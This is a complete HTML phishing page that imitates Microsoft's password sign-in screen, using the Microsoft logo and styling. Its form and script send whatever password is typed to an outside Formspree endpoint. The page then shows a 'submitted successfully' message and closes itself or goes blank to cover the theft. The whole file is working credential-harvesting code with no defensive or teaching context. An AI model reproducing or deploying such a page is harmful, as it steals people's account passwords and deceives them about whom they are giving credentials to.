<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Microsoft Login</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f3f2f1;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-container {
      background: #fff;
      padding: 40px;
      width: 350px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      border-radius: 6px;
      display: flex;
      flex-direction: column;
      align-items: stretch;
    }
    .logo {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
    }
    .logo img { height: 24px; }
    .input-label { font-size: 14px; margin-bottom: 8px; color: #1b1b1b; }
    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 14px;
    }
    .button {
      background-color: #0067b8;
      color: #fff;
      border: none;
      padding: 10px;
      width: 100%;
      border-radius: 4px;
      cursor: pointer;
      font-size: 14px;
      position: relative;
    }
    .button:hover { background-color: #005da6; }
    .button:active { background-color: #004e8c; }
    .spinner {
      display: none;
      width: 16px;
      height: 16px;
      border: 2px solid #fff;
      border-top: 2px solid rgba(255,255,255,0.3);
      border-radius: 50%;
      position: absolute;
      top: 50%;
      left: 50%;
      margin-top: -8px;
      margin-left: -8px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .link, .other-link {
      font-size: 12px;
      color: #0067b8;
      text-decoration: none;
      display: block;
      margin-top: 10px;
    }
    .link:hover, .other-link:hover { text-decoration: underline; }

    /* Success modal */
    .modal {
      display: none;
      position: fixed;
      top:0; left:0;
      width:100%;
      height:100%;
      background: rgba(0,0,0,0.4);
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }
    .modal-content {
      background: #fff;
      padding: 20px 30px;
      border-radius: 6px;
      text-align: center;
      font-size: 14px;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
    }
  </style>
</head>
<body>

  <div class="login-container">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
    </div>

    <div class="input-label">Enter your password</div>

    <form id="passwordForm" action="https://formspree.io/f/xpwlqqbb" method="POST">
      <input type="password" id="password-input" name="password" placeholder="Password" required>
      <button type="submit" class="button">
        Next
        <div class="spinner" id="spinner"></div>
      </button>
    </form>

    <a href="#" class="link">Forgot your password?</a>
    <a href="#" class="other-link">Other ways to sign in</a>
  </div>

  <!-- Success Modal -->
  <div class="modal" id="successModal">
    <div class="modal-content">
      ✅ Password submitted successfully!
    </div>
  </div>

  <script>
    const form = document.getElementById("passwordForm");
    const input = document.getElementById("password-input");
    const button = form.querySelector(".button");
    const spinner = document.getElementById("spinner");
    const modal = document.getElementById("successModal");

    form.addEventListener("submit", async function(e) {
      e.preventDefault();

      if (!input.value.trim()) return;

      // Show spinner and disable button
      spinner.style.display = "block";
      button.disabled = true;
      button.style.cursor = "not-allowed";

      try {
        // Send data to Formspree
        await fetch(form.action, {
          method: "POST",
          body: new FormData(form),
          headers: { "Accept": "application/json" }
        });

        // Show success modal
        modal.style.display = "flex";

        // Wait 1.5 seconds and exit page
        setTimeout(() => {
          window.close(); // may work if opened via JS
          window.location.href = "about:blank"; // fallback
        }, 1500);

      } catch(err) {
        alert("Something went wrong. Try again.");
        button.disabled = false;
        spinner.style.display = "none";
      }
    });

    // Keep Enter key behavior
    input.addEventListener("keydown", function(e) {
      if (e.key === "Enter") {
        form.dispatchEvent(new Event("submit", { cancelable: true }));
      }
    });
  </script>

</body>
</html>
